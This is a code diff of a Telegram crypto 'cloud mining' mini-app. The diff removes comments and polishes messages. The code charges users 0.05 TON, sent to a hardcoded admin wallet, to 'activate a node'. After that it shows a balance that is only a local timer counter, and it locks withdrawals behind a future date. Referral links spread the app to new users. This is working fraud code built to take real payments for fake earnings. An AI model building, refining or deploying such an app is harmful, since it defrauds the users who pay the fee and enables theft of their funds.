@@ -15,7 +15,6 @@
       --accent-cyan: #00e5ff;
       --accent-gold: #f59e0b;
       --accent-green: #10b981;
-      --accent-red: #ff4757;
       --text-main: #ffffff;
       --text-sub: #7e8fa6;
     }
@@ -96,9 +95,8 @@
     <div id="ton-connect-btn"></div>
   </div>
 
-  <!-- TAB 1: MINING (REQUIRES 0.05 TON ACTIVATION) -->
+  <!-- TAB 1: MINING -->
   <div id="tab-mining" class="tab-content active">
-    <!-- Balance Card -->
     <div class="card">
       <div class="card-title">
         <span>💼 Total NEX Balance</span>
@@ -107,7 +105,6 @@
       <div class="balance-val"><span id="total-balance">0.0000</span> <span>$NEX</span></div>
     </div>
 
-    <!-- Active Mining Card -->
     <div class="card">
       <div class="card-title">
         <span style="color: var(--accent-cyan);">⚡ Cloud Node Mining</span>
@@ -138,23 +135,20 @@
         </div>
       </div>
 
-      <!-- Mining Button: 0.05 TON ပေးပြီးမှ စတင်မည် -->
       <button id="mining-btn" class="btn-main btn-gold" onclick="handleMiningAction()">
         ⚡ Activate Node (0.05 TON)
       </button>
     </div>
 
-    <!-- Node Info -->
     <div class="card" style="border-color: #1a273f; background: #09121f;">
       <div style="font-size: 12px; color: var(--text-sub); line-height: 1.6;">
-        ℹ️ <b>Node Deployment:</b> A one-time on-chain verification fee of <b>0.05 TON</b> is required to allocate server resources and activate cloud mining.
+        ℹ️ <b>Node Deployment:</b> A one-time verification fee of <b>0.05 TON</b> is required to allocate server resources and start mining.
       </div>
     </div>
   </div>
 
-  <!-- TAB 2: TASKS (DAILY STREAK + MISSIONS) -->
+  <!-- TAB 2: TASKS (DAILY CHECK-IN + MISSIONS) -->
   <div id="tab-tasks" class="tab-content">
-    <!-- Daily Streak Reward Card -->
     <div class="card" style="border-color: var(--accent-gold);">
       <div class="card-title">
         <span style="font-weight: 700; color: #fff;">🎁 Daily Check-in Streak</span>
@@ -164,7 +158,6 @@
       <button id="daily-claim-btn" class="btn-main btn-gold" style="padding: 10px;" onclick="claimDailyReward()">Claim Daily Check-in</button>
     </div>
 
-    <!-- Missions -->
     <div class="card">
       <div class="card-title">
         <span style="font-weight: 800; color: #fff; font-size: 14px;">🎯 Ecosystem Missions</span>
@@ -206,7 +199,7 @@
     </div>
   </div>
 
-  <!-- TAB 4: WITHDRAW (NORMAL FORM WITH JAN 1 DATE NOTICE) -->
+  <!-- TAB 4: WITHDRAW -->
   <div id="tab-wallet" class="tab-content">
     <div class="card">
       <div class="card-title">
@@ -235,7 +228,6 @@
         </div>
       </div>
 
-      <!-- Withdraw Button & January 1 Notice -->
       <button class="btn-main btn-locked" onclick="alert('Withdrawals and DEX claim portal will be activated on January 1, 2027!')">
         🔒 Available on January 1, 2027
       </button>
@@ -265,9 +257,10 @@
     document.getElementById('user-display-name').innerText = '@' + (tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name);
   }
 
-  // 1. TON Connect Setup
+  // TON Connect (လက်ရှိ host domain ဆီမှ manifest ကို ဆွဲယူမည်)
+  const manifestUrl = window.location.origin + '/tonconnect-manifest.json';
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://io-mining-app.netlify.app/tonconnect-manifest.json',
+    manifestUrl: manifestUrl,
     buttonRootId: 'ton-connect-btn'
   });
 
@@ -277,10 +270,9 @@
     }
   });
 
-  // 2. 0.05 TON Node Activation & Mining Logic
-  const MINING_SPEED = 8.50; // Rate per hour
-  const CYCLE_SECONDS = 4 * 3600; // 4 Hours cycle
-  const ADMIN_WALLET = "UQCtK8T282nvdQvXQ9yHffu4O9T9E-4qYqB8N_9_U6yUuES8"; // သင့် TON Wallet Address
+  const MINING_SPEED = 8.50;
+  const CYCLE_SECONDS = 4 * 3600;
+  const ADMIN_WALLET = "UQCtK8T282nvdQvXQ9yHffu4O9T9E-4qYqB8N_9_U6yUuES8";
 
   let isNodeActive = localStorage.getItem('nex_node_active') === 'true';
   let totalBalance = parseFloat(localStorage.getItem('nex_bal')) || 0.0;
@@ -335,18 +327,17 @@
   async function handleMiningAction() {
     if (!isNodeActive) {
       if (!tonConnectUI.connected) {
-        alert("Please connect your Tonkeeper or TON wallet first!");
+        alert("Please connect your Tonkeeper wallet first!");
         tonConnectUI.openModal();
         return;
       }
 
-      // 0.05 TON Transaction တောင်းဆိုခြင်း
       const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 300,
         messages: [
           {
             address: ADMIN_WALLET,
-            amount: "50000000" // 0.05 TON in nanotons
+            amount: "50000000" // 0.05 TON
           }
         ]
       };
@@ -357,15 +348,14 @@
         miningStart = Date.now();
         localStorage.setItem('nex_node_active', 'true');
         localStorage.setItem('nex_start', miningStart);
-        alert("Node successfully activated! Cloud mining started.");
+        alert("Node Activated! Mining started.");
         updateMiningUI();
       } catch (err) {
-        alert("Transaction failed or canceled: " + err.message);
+        alert("Transaction canceled: " + err.message);
       }
       return;
     }
 
-    // Claim Logic
     const ratePerSec = MINING_SPEED / 3600;
     const now = Date.now();
     let elapsedSec = Math.floor((now - miningStart) / 1000);
@@ -381,7 +371,7 @@
   setInterval(updateMiningUI, 1000);
   updateMiningUI();
 
-  // 3. Daily Streak System in Tasks Tab
+  // Daily Streak
   const dailyRewards = [25, 35, 50, 75, 100, 150, 250];
   let streakDay = parseInt(localStorage.getItem('nex_streak_day')) || 1;
   let lastClaimDate = localStorage.getItem('nex_last_streak_date') || "";
@@ -429,14 +419,13 @@
       streakDay = 1;
     }
     localStorage.setItem('nex_streak_day', streakDay);
-
     renderStreak();
     updateMiningUI();
-    alert(`Success! +${reward} $NEX claimed to your balance!`);
+    alert(`Success! +${reward} $NEX claimed!`);
   }
   renderStreak();
 
-  // 4. Tasks Verification
+  // Tasks
   function handleTask(taskId, reward, link, btn) {
     if (localStorage.getItem('nex_done_' + taskId)) return;
     window.open(link, '_blank');
@@ -452,7 +441,6 @@
     }, 3000);
   }
 
-  // 5. Navigation
   function switchTab(tabId, el) {
     document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
@@ -460,7 +448,6 @@
     el.classList.add('active');
   }
 
-  // 6. Referral
   const refLink = `https://t.me/NEXORA_Crypto_Mining_Bot?start=nex_${telegramUserId}`;
   document.getElementById('ref-link-display').innerText = refLink;
   function shareRefTelegram() {
